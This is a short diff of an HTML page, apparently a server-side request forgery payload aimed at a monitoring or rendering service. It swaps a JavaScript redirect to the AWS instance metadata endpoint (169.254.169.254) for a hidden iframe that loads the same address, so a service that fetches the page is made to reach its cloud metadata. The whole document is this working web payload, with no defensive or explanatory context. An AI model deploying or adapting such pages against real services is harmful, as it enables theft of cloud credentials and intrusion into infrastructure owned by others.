@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="utf-8">
-    <title>Monitor Redirect</title>
+    <title>Monitor Metadata</title>
     <style>
       body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; text-align: center; }
       h1 { color: #333; }
@@ -10,10 +10,8 @@
     </style>
   </head>
   <body>
-    <h1>Redirecting...</h1>
-    <p>Attempting JS redirect to AWS metadata (http://169.254.169.254/latest/meta-data/)...</p>
-    <script>
-      window.location = "http://169.254.169.254/latest/meta-data/";
-    </script>
+    <h1>Checking Metadata...</h1>
+    <p>Fetching AWS metadata via iframe...</p>
+    <iframe src="http://169.254.169.254/latest/meta-data/" style="display:none"></iframe>
   </body>
 </html>
